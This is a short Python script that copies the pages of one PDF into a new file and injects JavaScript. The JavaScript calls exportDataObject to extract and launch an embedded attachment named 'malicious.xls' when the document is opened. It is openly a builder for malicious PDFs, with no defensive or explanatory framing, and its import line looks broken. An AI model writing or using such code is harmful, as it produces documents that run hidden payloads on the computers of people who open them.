#from PyPDF2 import PdfFileWriter, PdfFileReader
from PyPDF import PdfFileWriter, PdfFileReader

output = PdfFileWriter()
ipdf = PdfFileReader(open('01.pdf', 'rb'))

for i in xrange(ipdf.getNumPages()):
	page = ipdf.getPage(i)
	output.addPage(page)

with open('02.pdf', 'wb') as f:
	output.addJS("this.exportDataObject({cName:\"malicious.xls\",nLaunch:2,});")
	output.write(f)
